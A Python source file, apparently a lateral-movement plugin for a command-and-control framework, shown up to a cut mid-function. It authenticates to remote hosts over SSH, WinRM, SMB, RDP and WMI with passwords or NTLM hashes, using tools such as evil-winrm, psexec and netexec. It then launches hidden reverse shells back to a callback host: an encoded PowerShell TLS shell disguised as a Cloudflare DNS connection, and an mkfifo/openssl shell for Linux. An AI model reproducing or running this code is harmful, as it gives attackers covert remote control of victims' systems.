"""Cross-platform C2 token creation plugin supporting SSH, WinRM, SMB, and RDP using command-line tools.

This plugin establishes connections to remote targets and delivers a reverse shell payload
that connects back to the TornadoRevC2 reverse shell handler over TLS.
The payload is executed in the background to avoid blocking the plugin.
"""

import argparse
import os
import subprocess
import shutil
import time
from abc import ABC, abstractmethod
from typing import Dict, Optional, Tuple, Any, List, Union

from ..api import plugin, SessionContext


class RemoteTransportError(Exception):
    """Base exception for remote transport errors."""
    pass

class RemoteTransport(ABC):
    DEFAULT_PORTS = {
        'ssh': 22,
        'winrm': 5985,
        'smb': 445,
        'rdp': 3389,
        'wmi': 135,
        'mssql': 1433,
    }

    SUPPORTED_OS = {
        'ssh': ['windows', 'linux', 'macos'],
        'winrm': ['windows'],
        'smb': ['windows', 'linux'],
        'rdp': ['windows', 'linux'],
        'wmi': ['windows'],
        'mssql': ['windows'],
    }

    def __init__(self):
        self.connected = False
        self._platform = None
        self._detected = False
        self._host = None
        self._username = None
        self._target_os = None
        self._password = None
        self._callback_host = None
        self._callback_port = None
        self._port = None
        self._ntlm_hash = None
        self._private_key = None
        self._use_nxc = False

    @abstractmethod
    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        """Establish connection to remote host."""
        pass

    @abstractmethod
    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        """Execute command on remote host. If background=True, detach and return quickly."""
        pass

    @abstractmethod
    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        """Deliver and execute payload on remote host in background."""
        pass

    @abstractmethod
    def close(self):
        """Close connection."""
        pass

    def detect_platform(self) -> str:
        """Detect remote platform: 'windows' or 'linux'."""
        if not self._detected:
            self._platform = self._perform_platform_detection()
            self._detected = True
        return self._platform

    def _perform_platform_detection(self) -> str:
        return "unknown"

    def _check_command(self, command: str) -> bool:
        return shutil.which(command) is not None

    def _run_command(self, cmd: list, timeout: int = 30) -> Tuple[bool, str, str]:
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                shell=False,
            )
            return result.returncode == 0, result.stdout, result.stderr
        except subprocess.TimeoutExpired as e:
            return False, "", f"Command timed out after {timeout}s: {e}"
        except FileNotFoundError as e:
            return False, "", f"Command not found: {e}"
        except Exception as e:
            return False, "", str(e)

    def _generate_payload(self, target_os: str, callback_host: str, callback_port: int) -> str:
        if target_os == 'windows':
            ps_script = (
                f"$TCPClient = New-Object Net.Sockets.TCPClient('{callback_host}', {callback_port});"
                f"$NetworkStream = $TCPClient.GetStream();"
                f"$SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));"
                f"$SslStream.AuthenticateAsClient('cloudflare-dns.com');"
                f"$StreamWriter = New-Object IO.StreamWriter($SslStream);"
                f"function WriteToStream ($String) {{$StreamWriter.Write($String + 'SHELL> '); $StreamWriter.Flush()}};"
                f"WriteToStream '';"
                f"while (($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{"
                f"    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
                f"    try {{ $Output = Invoke-Expression $Command 2>&1 | Out-String }} catch {{ $Output = $_ | Out-String }}"
                f"    WriteToStream $Output"
                f"}};"
                f"$StreamWriter.Close()"
            )
            import base64
            encoded = base64.b64encode(ps_script.encode('utf-16le')).decode()
            return f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Start-Process -WindowStyle Hidden -NoNewWindow -FilePath powershell -ArgumentList \'-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}\'"'
        else:
            return f'nohup sh -c "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {callback_host}:{callback_port} > /tmp/s; rm /tmp/s" >/dev/null 2>&1 &'

    def _get_os_specific_command(self, cmd_dict: Dict[str, str], target_os: str) -> Optional[str]:
        return cmd_dict.get(target_os)


class SSHTransport(RemoteTransport):
    def __init__(self):
        super().__init__()
        self._ssh_command = None
        self._sshpass_available = False
        self._use_sshpass = False

    def _ensure_dependency(self):
        if self._ssh_command is None:
            if self._check_command('ssh'):
                self._ssh_command = 'ssh'
            else:
                raise RemoteTransportError(
                    "SSH transport requires 'ssh' command-line tool. "
                    "Install it with your system package manager (e.g., apt install openssh-client)"
                )
        self._sshpass_available = self._check_command('sshpass')

    def _build_ssh_cmd(self, command: str, background: bool = False,
                       with_batch: Optional[bool] = None) -> List[str]:
        base = [self._ssh_command]
        base.extend(['-o', 'StrictHostKeyChecking=no'])
        base.extend(['-o', 'ConnectTimeout=10'])
        if with_batch is None:
            with_batch = not self._use_sshpass
        if with_batch:
            base.extend(['-o', 'BatchMode=yes'])
        if self._use_sshpass and self._password:
            base.extend(['-o', 'PasswordAuthentication=yes'])
        base.extend(['-p', str(self._port)])
        if self._private_key:
            base.extend(['-i', self._private_key])
        if background:
            base.append('-f')
        base.append(f"{self._username}@{self._host}")
        base.append(command)
        if self._use_sshpass and self._password:
            return ['sshpass', '-p', self._password] + base
        return base

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        private_key_path = kwargs.get('private_key')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['ssh']
        target_os = kwargs.get('target_os')
        callback_host = kwargs.get('callback_host')
        callback_port = kwargs.get('callback_port')

        self._host = host
        self._username = username
        self._password = password
        self._target_os = target_os
        self._callback_host = callback_host
        self._callback_port = callback_port
        self._port = port
        self._private_key = private_key_path
        self._use_nxc = use_nxc

        if use_nxc:
            return self._connect_nxc(host, username, password, private_key_path, port)

        if private_key_path:
            if not os.path.exists(private_key_path):
                raise RemoteTransportError(f"Private key file not found: {private_key_path}")
            if not os.access(private_key_path, os.R_OK):
                raise RemoteTransportError(f"Private key file not readable: {private_key_path}")
            self._use_sshpass = False
        elif password:
            if not self._sshpass_available:
                raise RemoteTransportError(
                    "Password authentication requires 'sshpass' command-line tool. "
                    "Install it with: apt install sshpass (or use private key authentication)"
                )
            self._use_sshpass = True
        else:
            raise RemoteTransportError("SSH requires either password or private key")

        cmd = self._build_ssh_cmd("echo SSH_CONNECTION_SUCCESS", with_batch=False)
        success, stdout, stderr = self._run_command(cmd, timeout=15)

        if success and 'SSH_CONNECTION_SUCCESS' in stdout:
            self.connected = True
            return True
        else:
            error_msg = stderr.strip() if stderr else stdout.strip()
            raise RemoteTransportError(f"SSH connection test failed: {error_msg}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     private_key_path: Optional[str] = None, port: int = 22) -> bool:
        if not self._check_command('netexec'):
            raise RemoteTransportError("netexec tool not found. Install with: pip install netexec")

        try:
            cmd = ['netexec', 'ssh', host, '-u', username]
            if port is not None and port != self.DEFAULT_PORTS['ssh']:
                cmd.extend(['--port', str(port)])
            if password:
                cmd.extend(['-p', password])
            elif private_key_path:
                cmd.extend(['-i', private_key_path])
            else:
                raise RemoteTransportError("Password or private key required for netexec SSH")
            cmd.extend(['-x', 'exit'])
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                error_msg = stderr.strip() or stdout.strip() or "Unknown error"
                raise RemoteTransportError(f"netexec SSH connection failed: {error_msg}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec SSH connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"

        target_os = target_os or self._target_os or 'linux'
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if self._use_nxc:
            try:
                cmd = ['netexec', 'ssh', self._host, '-u', self._username]
                if self._password:
                    cmd.extend(['-p', self._password])
                elif self._private_key:
                    cmd.extend(['-i', self._private_key])
                else:
                    return False, "No authentication available for netexec SSH"
                if self._port is not None and self._port != self.DEFAULT_PORTS['ssh']:
                    cmd.extend(['--port', str(self._port)])
                cmd.extend(['-x', command])
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

        try:
            cmd = self._build_ssh_cmd(command, background=background)
            timeout = 10 if background else 60
            success, stdout, stderr = self._run_command(cmd, timeout=timeout)
            if success:
                return True, stdout
            else:
                return False, stderr
        except Exception as e:
            return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None

    def _perform_platform_detection(self) -> str:
        if not self.connected:
            return "unknown"
        if self._use_nxc:
            try:
                cmd = ['netexec', 'ssh', self._host, '-u', self._username]
                if self._password:
                    cmd.extend(['-p', self._password])
                elif self._private_key:
                    cmd.extend(['-i', self._private_key])
                else:
                    return "unknown"
                if self._port is not None and self._port != self.DEFAULT_PORTS['ssh']:
                    cmd.extend(['--port', str(self._port)])
                cmd.extend(['-x', 'uname -s 2>/dev/null || echo Windows'])
                success, stdout, _ = self._run_command(cmd, timeout=10)
                if success:
                    if 'Linux' in stdout or 'Darwin' in stdout:
                        return "linux"
                    elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
                        return "windows"
                cmd[-1] = 'ver 2>nul || echo Linux'
                success, stdout, _ = self._run_command(cmd, timeout=10)
                if success and ('Microsoft' in stdout or 'Windows' in stdout):
                    return "windows"
                return "linux"
            except Exception:
                return "unknown"
        else:
            try:
                cmd = self._build_ssh_cmd('uname -s 2>/dev/null || echo Windows', with_batch=False)
                success, stdout, _ = self._run_command(cmd, timeout=10)
                if success:
                    if 'Linux' in stdout or 'Darwin' in stdout:
                        return "linux"
                    elif 'Windows' in stdout or 'CYGWIN' in stdout or 'MSYS' in stdout:
                        return "windows"
                cmd = self._build_ssh_cmd('ver 2>nul || echo Linux', with_batch=False)
                success, stdout, _ = self._run_command(cmd, timeout=10)
                if success and ('Microsoft' in stdout or 'Windows' in stdout):
                    return "windows"
                return "linux"
            except Exception:
                return "unknown"


class WinRMTransport(RemoteTransport):
    def __init__(self):
        super().__init__()
        self._evil_winrm_available = False
        self._netexec_available = False

    def _ensure_dependency(self):
        self._evil_winrm_available = self._check_command('evil-winrm')
        self._netexec_available = self._check_command('netexec')
        if not (self._evil_winrm_available or self._netexec_available):
            raise RemoteTransportError(
                "WinRM requires either 'evil-winrm' or 'netexec'. "
                "Install evil-winrm: gem install evil-winrm, or netexec: pip install netexec"
            )

    def _connect_evilwinrm(self, host: str, username: str, password: Optional[str] = None,
                           ntlm_hash: Optional[str] = None, port: int = 5985) -> bool:
        cmd = ['evil-winrm', '-i', host, '-u', username]
        if ntlm_hash:
            cmd.extend(['-H', ntlm_hash])
        elif password:
            cmd.extend(['-p', password])
        else:
            raise RemoteTransportError("Password or NTLM hash required for evil-winrm")
        if port is not None and port != self.DEFAULT_PORTS['winrm']:
            cmd.extend(['-P', str(port)])
        cmd.extend(['-c', 'echo EVILWINRM_CONNECTION_SUCCESS'])
        success, stdout, stderr = self._run_command(cmd, timeout=20)
        if success and 'EVILWINRM_CONNECTION_SUCCESS' in stdout:
            return True
        else:
            error_msg = stderr.strip() or stdout.strip() or "Unknown error"
            raise RemoteTransportError(f"evil-winrm connection failed: {error_msg}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: int = 5985) -> bool:
        try:
            cmd = ['netexec', 'winrm', host, '-u', username]
            if port is not None and port != self.DEFAULT_PORTS['winrm']:
                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            if success:
                return True
            else:
                raise RemoteTransportError(f"netexec WinRM connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec WinRM connection failed: {e}")

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("WinRM does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['winrm']
        target_os = kwargs.get('target_os', 'windows')
        callback_host = kwargs.get('callback_host')
        callback_port = kwargs.get('callback_port')

        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = target_os
        self._callback_host = callback_host
        self._callback_port = callback_port
        self._port = port
        self._use_nxc = use_nxc

        if not use_nxc and self._evil_winrm_available:
            connected = self._connect_evilwinrm(host, username, password, ntlm_hash, port)
        else:
            if not self._netexec_available:
                raise RemoteTransportError("netexec not available for WinRM")
            connected = self._connect_nxc(host, username, password, ntlm_hash, port)

        if connected:
            self.connected = True
            return True
        else:
            return False

    def _execute_evilwinrm_command(self, command: str, background: bool = False) -> Tuple[bool, str]:
        cmd = ['evil-winrm', '-i', self._host, '-u', self._username]
        if self._ntlm_hash:
            cmd.extend(['-H', self._ntlm_hash])
        elif self._password:
            cmd.extend(['-p', self._password])
        else:
            return False, "No authentication available for evil-winrm"
        if self._port is not None and self._port != self.DEFAULT_PORTS['winrm']:
            cmd.extend(['-P', str(self._port)])
        cmd.extend(['-c', command])
        timeout = 10 if background else 60
        success, stdout, stderr = self._run_command(cmd, timeout=timeout)
        if success:
            return True, stdout
        else:
            return False, stderr or stdout

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"
        target_os = target_os or self._target_os or 'windows'
        if target_os != 'windows':
            return False, f"WinRM only supports Windows targets"
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if not self._use_nxc and self._evil_winrm_available:
            return self._execute_evilwinrm_command(command, background)
        else:
            try:
                cmd = [
                    'netexec', 'winrm', self._host,
                    '-u', self._username,
                    '-x', command
                ]
                if self._ntlm_hash:
                    cmd.extend(['-H', self._ntlm_hash])
                elif self._password:
                    cmd.extend(['-p', self._password])
                else:
                    return False, "No authentication available for netexec WinRM"
                if self._port is not None and self._port != self.DEFAULT_PORTS['winrm']:
                    cmd.extend(['--port', str(self._port)])
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None

    def _perform_platform_detection(self) -> str:
        return "windows"


class SMBTransport(RemoteTransport):
    def __init__(self):
        super().__init__()
        self._psexec_cmd = None
        self._netexec_available = False

    def _ensure_dependency(self):
        if self._check_command('psexec.py'):
            self._psexec_cmd = 'psexec.py'
        elif self._check_command('impacket-psexec'):
            self._psexec_cmd = 'impacket-psexec'
        else:
            self._psexec_cmd = None

        self._netexec_available = self._check_command('netexec')

        if not (self._psexec_cmd or self._netexec_available):
            raise RemoteTransportError(
                "SMB requires either 'psexec.py' (or 'impacket-psexec') from impacket, or 'netexec'. "
                "Install impacket: pip install impacket, or netexec: pip install netexec"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("SMB does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['smb']
        target_os = kwargs.get('target_os', 'windows')

        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for SMB")

        if target_os == 'linux' and not use_nxc:
            raise RemoteTransportError(
                "SMB to Linux targets requires --nxc (netexec), because psexec only supports Windows"
            )
        if use_nxc and not self._netexec_available:
            raise RemoteTransportError("--nxc requested but netexec is not installed")

        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = target_os
        self._callback_host = kwargs.get('callback_host')
        self._callback_port = kwargs.get('callback_port')
        self._port = port
        self._use_nxc = use_nxc

        if self._use_nxc:
            return self._connect_nxc(host, username, password, ntlm_hash, port)
        else:
            if not self._psexec_cmd:
                raise RemoteTransportError("No psexec command found (tried psexec.py and impacket-psexec)")
            return self._connect_psexec(host, username, password, ntlm_hash, port)

    def _connect_psexec(self, host: str, username: str, password: Optional[str] = None,
                        ntlm_hash: Optional[str] = None, port: int = 445) -> bool:
        host_spec = f"{host}:{port}" if (port is not None and port != self.DEFAULT_PORTS['smb']) else host
        try:
            if password:
                cmd = [self._psexec_cmd, f'{username}:{password}@{host_spec}', 'cmd.exe', '/c', 'exit']
            elif ntlm_hash:
                cmd = [self._psexec_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', 'cmd.exe', '/c', 'exit']
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            if success:
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._psexec_cmd} connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._psexec_cmd} connection failed: {e}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: int = 445) -> bool:
        try:
            cmd = ['netexec', 'smb', host, '-u', username]
            if port is not None and port != self.DEFAULT_PORTS['smb']:
                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"netexec SMB connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec SMB connection failed: {e}")

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"
        target_os = target_os or self._target_os or 'windows'
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if self._use_nxc:
            try:
                cmd = ['netexec', 'smb', self._host, '-u', self._username]
                if self._ntlm_hash:
                    cmd.extend(['-H', self._ntlm_hash])
                elif self._password:
                    cmd.extend(['-p', self._password])
                else:
                    return False, "No authentication available"
                if self._port is not None and self._port != self.DEFAULT_PORTS['smb']:
                    cmd.extend(['--port', str(self._port)])
                if target_os == 'windows':
                    cmd.extend(['-x', command])
                else:
                    cmd.extend(['-X', command])
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)
        else:
            if target_os != 'windows':
                return False, "psexec only supports Windows targets. Use --nxc for Linux."
            if not self._psexec_cmd:
                return False, "No psexec command available"
            host_spec = f"{self._host}:{self._port}" if (self._port is not None and self._port != self.DEFAULT_PORTS['smb']) else self._host
            try:
                if self._password:
                    cmd = [self._psexec_cmd, f'{self._username}:{self._password}@{host_spec}', command]
                elif self._ntlm_hash:
                    cmd = [self._psexec_cmd, f'{self._username}@{host_spec}', '-hashes', f':{self._ntlm_hash}', command]
                else:
                    return False, "No authentication available"
                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)
                if success:
                    return True, stdout
                else:
                    return False, stderr
            except Exception as e:
                return False, str(e)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None

    def _perform_platform_detection(self) -> str:
        return self._target_os if self._target_os in ('windows', 'linux') else 'windows'


class RDPTransport(RemoteTransport):
    def __init__(self):
        super().__init__()
        self._xfreerdp_command = None
        self._netexec_available = False

    def _ensure_dependency(self):
        self._netexec_available = self._check_command('netexec')
        if self._check_command('xfreerdp3'):
            self._xfreerdp_command = 'xfreerdp3'
        elif self._check_command('xfreerdp'):
            self._xfreerdp_command = 'xfreerdp'
        else:
            self._xfreerdp_command = None

        if not (self._netexec_available or self._xfreerdp_command):
            raise RemoteTransportError(
                "RDP requires either 'netexec' (for command execution) or 'xfreerdp'/'xfreerdp3'. "
                "Install netexec: pip install netexec, or freerdp: apt install freerdp3"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("RDP does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', True)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['rdp']
        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for RDP")
        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = kwargs.get('target_os')
        self._callback_host = kwargs.get('callback_host')
        self._callback_port = kwargs.get('callback_port')
        self._port = port
        self._use_nxc = use_nxc or not self._xfreerdp_command

        if self._use_nxc:
            return self._connect_nxc(host, username, password, ntlm_hash, port)
        else:
            return self._connect_xfreerdp(host, username, password, ntlm_hash, port)

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: int = 3389) -> bool:
        try:
            cmd = ['netexec', 'rdp', host, '-u', username]
            if port is not None and port != self.DEFAULT_PORTS['rdp']:
                cmd.extend(['--port', str(port)])
            if ntlm_hash:
                cmd.extend(['-H', ntlm_hash])
            elif password:
                cmd.extend(['-p', password])
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            output = stdout + stderr
            if success or 'authenticated' in output.lower():
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"netexec RDP connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"netexec RDP connection failed: {e}")

    def _connect_xfreerdp(self, host: str, username: str, password: Optional[str] = None,
                          ntlm_hash: Optional[str] = None, port: int = 3389) -> bool:
        if ntlm_hash:
            raise RemoteTransportError("xfreerdp does not support NTLM hash. Use --nxc.")
        if not password:
            raise RemoteTransportError("Password required for xfreerdp")
        try:
            host_spec = f"{host}:{port}" if (port is not None and port != self.DEFAULT_PORTS['rdp']) else host
            cmd = [
                self._xfreerdp_command,
                '/v:' + host_spec,
                '/u:' + username,
                '/p:' + password,
                '/cert-ignore',
                '/timeout:10000',
                '/network:lan',
                '/gfx-h264:off',
                '/gdi:sw',
                '/exit-after-disconnect',
            ]
            success, stdout, stderr = self._run_command(cmd, timeout=10)
            if success:
                self.connected = True
                return True
            else:
                error_lower = (stdout + stderr).lower()
                if 'failed to connect' in error_lower or 'connection refused' in error_lower:
                    raise RemoteTransportError(f"xfreerdp connection refused: {stderr.strip()}")
                elif 'could not open display' in error_lower:
                    raise RemoteTransportError(
                        "xfreerdp requires X11 display. Use --nxc flag for headless environments"
                    )
                else:
                    raise RemoteTransportError(f"xfreerdp connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"xfreerdp connection failed: {e}")

    def _execute_xfreerdp_command(self, command: str, background: bool = False) -> Tuple[bool, str]:
        if not self._xfreerdp_command:
            return False, "xfreerdp not available"
        if not self._password:
            return False, "xfreerdp requires password (NTLM hash not supported)"
        if self._ntlm_hash:
            return False, "xfreerdp does not support NTLM hash authentication"
        if self._target_os != 'windows':
            return False, "xfreerdp command execution is only supported for Windows targets"

        cmd = [
            self._xfreerdp_command,
            '/v:' + self._host,
            '/u:' + self._username,
            '/p:' + self._password,
            '/cert-ignore',
            '/timeout:10000',
            '/network:lan',
            '/gfx-h264:off',
            '/gdi:sw',
            '/app:cmd.exe',
            '/app-cmd:' + f'/c {command}',
            '/exit-after-disconnect',
        ]
        if self._port is not None and self._port != self.DEFAULT_PORTS['rdp']:
            cmd.append('/port:' + str(self._port))

        timeout = 10 if background else 60
        success, stdout, stderr = self._run_command(cmd, timeout=timeout)

        if success:
            return True, stdout
        else:
            error_lower = (stdout + stderr).lower()
            if 'could not open display' in error_lower:
                return False, "xfreerdp requires X11 display. Use --nxc flag for headless environments"
            elif 'failed to connect' in error_lower:
                return False, f"xfreerdp connection failed: {stderr.strip()}"
            else:
                return False, f"xfreerdp command execution failed: {stderr.strip() or stdout.strip()}"

    def execute_command(self, command: Union[str, Dict[str, str]], target_os: Optional[str] = None,
                        background: bool = False) -> Tuple[bool, str]:
        if not self.connected:
            return False, "Not connected"

        target_os = target_os or self._target_os or 'windows'
        if isinstance(command, dict):
            command = self._get_os_specific_command(command, target_os)
            if command is None:
                return False, f"No command found for OS: {target_os}"

        if self._netexec_available and self._use_nxc:
            try:
                cmd = ['netexec', 'rdp', self._host, '-u', self._username]
                if self._ntlm_hash:
                    cmd.extend(['-H', self._ntlm_hash])
                elif self._password:
                    cmd.extend(['-p', self._password])
                else:
                    return False, "No authentication available for netexec RDP"

                if self._port is not None and self._port != self.DEFAULT_PORTS['rdp']:
                    cmd.extend(['--port', str(self._port)])

                if target_os == 'windows':
                    cmd.extend(['-x', command])
                else:
                    cmd.extend(['-X', command])

                timeout = 10 if background else 60
                success, stdout, stderr = self._run_command(cmd, timeout=timeout)

                if success:
                    return True, stdout
                else:
                    if 'unrecognized arguments' in stderr or 'invalid option' in stderr:
                        self._netexec_available = False
                    else:
                        return False, stderr
            except Exception:
                pass

        return self._execute_xfreerdp_command(command, background)

    def deliver_payload(self, payload: str, target_os: str) -> Tuple[bool, str]:
        return self.execute_command(payload, target_os, background=True)

    def close(self):
        self.connected = False
        self._host = self._username = self._password = self._target_os = None
        self._port = None
        self._ntlm_hash = None

    def _perform_platform_detection(self) -> str:
        return "windows"

class WMITransport(RemoteTransport):
    """WMI transport using wmiexec.py (impacket) or netexec/nxc."""
    
    def __init__(self):
        super().__init__()
        self._wmiexec_cmd = None
        self._nxc_cmd = None
        self._netexec_available = False

    def _ensure_dependency(self):
        if self._check_command('wmiexec.py'):
            self._wmiexec_cmd = 'wmiexec.py'
        elif self._check_command('impacket-wmiexec'):
            self._wmiexec_cmd = 'impacket-wmiexec'
        else:
            self._wmiexec_cmd = None

        if self._check_command('nxc'):
            self._nxc_cmd = 'nxc'
        elif self._check_command('netexec'):
            self._nxc_cmd = 'netexec'
        else:
            self._nxc_cmd = None
        self._netexec_available = self._nxc_cmd is not None

        if not (self._wmiexec_cmd or self._netexec_available):
            raise RemoteTransportError(
                "WMI requires either 'wmiexec.py' (or 'impacket-wmiexec') from impacket, or 'nxc'/'netexec'. "
                "Install impacket: pip install impacket, or netexec: pip install netexec"
            )

    def connect(self, host: str, username: str, password: Optional[str] = None, **kwargs) -> bool:
        self._ensure_dependency()
        if kwargs.get('private_key'):
            raise RemoteTransportError("WMI does not support private key authentication")
        ntlm_hash = kwargs.get('ntlm_hash')
        use_nxc = kwargs.get('use_nxc', False)
        port = kwargs.get('port')
        if port is None:
            port = self.DEFAULT_PORTS['wmi']
        target_os = kwargs.get('target_os', 'windows')
        callback_host = kwargs.get('callback_host')
        callback_port = kwargs.get('callback_port')

        if not password and not ntlm_hash:
            raise RemoteTransportError("Password or NTLM hash required for WMI")

        if target_os != 'windows':
            raise RemoteTransportError("WMI only supports Windows targets")

        self._host = host
        self._username = username
        self._password = password
        self._ntlm_hash = ntlm_hash
        self._target_os = target_os
        self._callback_host = callback_host
        self._callback_port = callback_port
        self._port = port
        self._use_nxc = use_nxc

        if self._use_nxc:
            if not self._netexec_available:
                raise RemoteTransportError("netexec/nxc not available for WMI")
            return self._connect_nxc(host, username, password, ntlm_hash, port)
        else:
            if not self._wmiexec_cmd:
                raise RemoteTransportError("No wmiexec command found (tried wmiexec.py and impacket-wmiexec)")
            return self._connect_wmiexec(host, username, password, ntlm_hash, port)

    def _connect_wmiexec(self, host: str, username: str, password: Optional[str] = None,
                         ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
        host_spec = f"{host}:{port}" if port else host
        try:
            if password:
                cmd = [self._wmiexec_cmd, f'{username}:{password}@{host_spec}', 'cmd.exe', '/c', 'exit']
            elif ntlm_hash:
                cmd = [self._wmiexec_cmd, f'{username}@{host_spec}', '-hashes', f':{ntlm_hash}', 'cmd.exe', '/c', 'exit']
            else:
                raise RemoteTransportError("Password or NTLM hash required")
            success, stdout, stderr = self._run_command(cmd, timeout=30)
            if success:
                self.connected = True
                return True
            else:
                raise RemoteTransportError(f"{self._wmiexec_cmd} connection failed: {stderr.strip()}")
        except RemoteTransportError:
            raise
        except Exception as e:
            raise RemoteTransportError(f"{self._wmiexec_cmd} connection failed: {e}")

    def _connect_nxc(self, host: str, username: str, password: Optional[str] = None,
                     ntlm_hash: Optional[str] = None, port: Optional[int] = None) -> bool:
        try:
            cmd = [self._nxc_cmd, 'wmi', host, '-u', username]
            if port:
